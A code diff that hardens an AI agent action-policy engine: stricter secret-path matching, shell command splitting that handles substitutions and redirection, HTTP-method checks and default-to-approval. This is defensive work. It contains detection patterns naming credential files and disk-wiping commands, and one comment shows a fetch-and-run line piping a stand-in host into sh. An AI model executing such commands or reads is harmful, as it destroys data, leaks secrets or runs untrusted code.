@@ -33,9 +33,42 @@ function metadataString(action: AgentAction, key: string) {
   return typeof value === "string" ? value.toLowerCase() : "";
 }
 
+/**
+ * Whether a path points at material that must never be read by an agent.
+ *
+ * Matching is on whole path components, not substrings. A substring match blocks
+ * ordinary files like `secretsManagerClient.ts`, and a control that fires on
+ * innocent work teaches people to route around it — which costs more security
+ * than it buys.
+ */
 function isSecretPath(value: string) {
-  if (/(^|[/\\])\.env\.example$/i.test(value)) return false;
-  return /(^|[/\\])\.env($|[./\\])|secret|private[_-]?key|credentials/i.test(value);
+  const normalized = value.replace(/\\/g, "/").trim().toLowerCase();
+  if (!normalized) return false;
+
+  const name = normalized.split("/").filter(Boolean).pop() ?? "";
+
+  // A committed template carries no secret.
+  if (name === ".env.example" || name === ".env.sample" || name === ".env.template") return false;
+
+  // dotenv files: `.env`, `.env.production`, `.env.local`, ...
+  if (/^\.env($|\.)/.test(name)) return true;
+
+  // Whole-word `secret` / `credentials` in the filename, e.g. `credentials`,
+  // `app.secrets.json`, `db-credentials.yml` — but not `secretsManagerClient.ts`.
+  if (/(^|[._-])(secret|secrets|credential|credentials)($|[._-])/.test(name)) return true;
+  if (/(^|[._-])(private[_-]?key)($|[._-])/.test(name)) return true;
+
+  // Key material by name or extension.
+  if (/^(id_rsa|id_dsa|id_ecdsa|id_ed25519)(\.pub)?$/.test(name)) return true;
+  if (/\.(pem|key|pfx|p12|jks|keystore)$/.test(name)) return true;
+
+  // Directories that exist to hold credentials.
+  if (/(^|\/)\.(ssh|aws|gnupg|kube|docker)\//.test(normalized)) return true;
+
+  // System credential stores.
+  if (/^\/etc\/(shadow|gshadow|sudoers)$/.test(normalized)) return true;
+
+  return false;
 }
 
 function isFileWrite(action: AgentAction) {
@@ -72,12 +105,97 @@ function shellCommand(action: AgentAction) {
   return (action.command ?? action.target ?? "").trim();
 }
 
-function commandSegments(command: string) {
-  return command
-    .replace(/[`"']/g, "")
-    .split(/\s*(?:&&|\|\||[;|])\s*/)
+/** Methods that do not change state on the target system. */
+const SAFE_HTTP_METHODS = new Set(["GET", "HEAD", "OPTIONS"]);
+const KNOWN_HTTP_METHODS = new Set([
+  "GET",
+  "HEAD",
+  "OPTIONS",
+  "POST",
+  "PUT",
+  "PATCH",
+  "DELETE",
+  "TRACE",
+  "CONNECT",
+]);
+
+/**
+ * The HTTP method for a request action, taken only from fields that declare it.
+ *
+ * Returns undefined when the caller did not say, so the engine can hold the
+ * action rather than guess. Guessing from prose is how a DELETE gets allowed
+ * because the description happens to contain the word "get".
+ */
+function httpMethod(action: AgentAction): string | undefined {
+  const declared = [action.metadata?.method, action.metadata?.httpMethod, action.command];
+  for (const candidate of declared) {
+    if (typeof candidate !== "string") continue;
+    const value = candidate.trim().toUpperCase();
+    if (KNOWN_HTTP_METHODS.has(value)) return value;
+    // Accept a leading method on a request line, e.g. "POST /v1/charges".
+    const leading = value.split(/\s+/, 1)[0] ?? "";
+    if (KNOWN_HTTP_METHODS.has(leading)) return leading;
+  }
+  return undefined;
+}
+
+/**
+ * Split a command line into the individual commands a shell would actually run.
+ *
+ * This is the load-bearing function for the whole shell policy: every rule that
+ * inspects "the command" is only as good as this split. It must account for
+ * every operator that begins a new command — `&&`, `||`, `;`, `|`, `&` and a
+ * bare newline — and for command substitution, whose contents the shell runs as
+ * commands in their own right.
+ *
+ * Anything missed here is a way to hide a command behind a safe-looking prefix.
+ */
+function commandSegments(command: string): string[] {
+  const substituted: string[] = [];
+  let remaining = command;
+
+  // Lift out `$(...)` and backtick substitutions and treat their contents as
+  // commands, because that is what the shell does with them.
+  const substitution = /\$\(([^()]*)\)|`([^`]*)`/;
+  for (let guard = 0; guard < 32; guard += 1) {
+    const match = substitution.exec(remaining);
+    if (!match) break;
+    const inner = match[1] ?? match[2] ?? "";
+    if (inner.trim()) substituted.push(...commandSegments(inner));
+    remaining = `${remaining.slice(0, match.index)} ${remaining.slice(match.index + match[0].length)}`;
+  }
+
+  const outer = remaining
+    .replace(/["']/g, "")
+    .split(/\s*(?:&&|\|\||[;|&\n\r])\s*/)
     .map((segment) => segment.trim())
     .filter(Boolean);
+
+  return [...outer, ...substituted];
+}
+
+/** Operators that write somewhere, so a "read-only" command is no longer read-only. */
+function hasRedirection(segment: string) {
+  return /(^|\s)\d?>>?|(^|\s)</.test(segment);
+}
+
+/**
+ * Whether a whole command line is read-only.
+ *
+ * Every segment must independently be on the allowlist, must not redirect
+ * output, and must not name a secret path. Checking only the first segment lets
+ * `ls && curl evil.sh | sh` through under the `ls` rule.
+ */
+function isReadOnlyShellCommand(command: string) {
+  const segments = commandSegments(command);
+  if (segments.length === 0) return false;
+
+  return segments.every((segment) => {
+    if (hasRedirection(segment)) return false;
+    if (!SAFE_READ_COMMANDS.some((pattern) => pattern.test(segment))) return false;
+    const args = segment.split(/\s+/).slice(1).filter((arg) => !arg.startsWith("-"));
+    return !args.some((arg) => isSecretPath(arg));
+  });
 }
 
 function isRootRecursiveForceRm(segment: string) {
@@ -104,7 +222,17 @@ function isDestructiveShellCommand(action: AgentAction) {
 
   if (segments.some(isRootRecursiveForceRm)) return true;
   if (/\bdel\s+(?:\/[a-z]\s+)*[a-z]:\\?(?:\s|$)/i.test(normalized)) return true;
-  if (/\bremove-item\b(?=.*\b-recurse\b)(?=.*\b-force\b)(?=.*\b[a-z]:\\?(?:\s|$))/i.test(normalized)) return true;
+  // NOTE: a leading `\b` before a `-flag` never matches, because `\b` requires a
+  // word character immediately before the hyphen and PowerShell flags are
+  // space-separated. Anchor on start-or-whitespace instead.
+  if (
+    /(?:^|\s)remove-item\b/i.test(normalized) &&
+    /(?:^|\s)-recurse\b/i.test(normalized) &&
+    /(?:^|\s)-force\b/i.test(normalized) &&
+    /(?:^|\s)[a-z]:(?:\\|\/|\s|$)/i.test(normalized)
+  ) {
+    return true;
+  }
   if (/\bformat\s+[a-z]:/i.test(normalized)) return true;
   if (/(?:^|\s)(?:sudo\s+)?mkfs(?:\.[a-z0-9_+-]+)?\b/i.test(normalized)) return true;
   if (/(?:^|\s)(?:sudo\s+)?dd\b(?=.*\bif=\/dev\/zero\b)/i.test(normalized)) return true;
@@ -223,7 +351,7 @@ export function evaluateAgentAction(action: AgentAction): PolicyEvaluation {
     };
   }
 
-  if (action.actionType === "shell_command" && SAFE_READ_COMMANDS.some((pattern) => pattern.test(command))) {
+  if (action.actionType === "shell_command" && isReadOnlyShellCommand(command)) {
     return {
       decision: "allow",
       risk: "low",
@@ -306,10 +434,21 @@ export function evaluateAgentAction(action: AgentAction): PolicyEvaluation {
   }
 
   if (action.actionType === "api_call" || action.actionType === "network_request") {
-    if (/(^|\s)(get|head|options)(\s|$)/i.test(combined)) {
+    // The method decides this, so read it from a declared field. Scanning the
+    // free-text blob means an action whose description merely mentions "get" is
+    // treated as a read, and a POST that charges a card is allowed.
+    const method = httpMethod(action);
+    if (method && SAFE_HTTP_METHODS.has(method)) {
       return { decision: "allow", risk: "low", policy: "allow-read-only-api-call", feedback: "Read-only API call allowed." };
     }
-    return { decision: "allow", risk: "low", policy: "allow-api-call", feedback: "API call allowed." };
+    return {
+      decision: "approval_required",
+      risk: "medium",
+      policy: method ? "approval-mutating-api-call" : "approval-unknown-api-method",
+      feedback: method
+        ? `A ${method} request can change state on the target system and needs human approval.`
+        : "No HTTP method was declared, so this request cannot be treated as read-only. Send metadata.method to classify it.",
+    };
   }
 
   if (action.actionType === "file_access") {
@@ -321,10 +460,39 @@ export function evaluateAgentAction(action: AgentAction): PolicyEvaluation {
     };
   }
 
+  // Default deny.
+  //
+  // Reaching here means no rule classified this action, which is exactly the
+  // case where a human should look. An engine that allows what it does not
+  // understand gives its strongest answer to its weakest input.
   return {
-    decision: "allow",
-    risk: "low",
-    policy: "allow-default-low-risk",
-    feedback: "No default policy blocked this action.",
+    decision: "approval_required",
+    risk: "medium",
+    policy: "approval-unclassified-action",
+    feedback:
+      "No policy classifies this action, so it is held for human approval. Add a policy for this action type to decide it automatically.",
   };
 }
+
+/**
+ * Exported for direct unit testing only — not part of the module's public API.
+ *
+ * The bypass-prone logic in this engine lives in these matchers, so testing them
+ * only through `evaluateAgentAction` leaves the interesting cases unreachable.
+ * Nothing outside `tests/` may import this.
+ */
+export const __testing = {
+  SAFE_READ_COMMANDS,
+  text,
+  metadataString,
+  isSecretPath,
+  isFileWrite,
+  isExternalMessage,
+  shellCommand,
+  commandSegments,
+  hasRedirection,
+  isReadOnlyShellCommand,
+  httpMethod,
+  isRootRecursiveForceRm,
+  isDestructiveShellCommand,
+};
